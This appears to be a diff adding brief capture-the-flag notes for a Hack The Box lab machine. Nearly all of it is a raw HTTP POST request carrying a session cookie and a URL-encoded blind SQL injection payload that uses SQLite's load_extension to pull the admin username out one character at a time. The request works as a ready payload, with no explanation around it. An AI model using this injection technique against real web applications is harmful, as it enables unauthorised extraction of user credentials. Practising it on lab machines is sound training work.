@@ -1,0 +1,22 @@
+
+
+(inject for characters in admin username)
+
++++++++++++++++++++++++++++++++++++
+
+POST /submitmessage HTTP/1.1
+Host: intense.htb
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
+Accept: */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://intense.htb/submit
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+X-Requested-With: XMLHttpRequest
+Content-Length: 143
+Connection: close
+Cookie: auth=dXNlcm5hbWU9Z3Vlc3Q7c2VjcmV0PTg0OTgzYzYwZjdkYWFkYzFjYjg2OTg2MjFmODAyYzBkOWY5YTNjM2MyOTVjODEwNzQ4ZmIwNDgxMTVjMTg2ZWM7.F612v3FG9sGgxG8LoQ70Mpqj4m3lsZPV2RrhgANghKs=
+
+message=%22'%7C%7C(SELECT+CASE+WHEN+SUBSTR(username%2C1%2C1)%3D'a'+THEN+1+ELSE+load_extension(''%2C'')+END+FROM+users+WHERE+role%3D1)%7C%7C'%22
+
++++++++++++++++++++++++++++++++++++
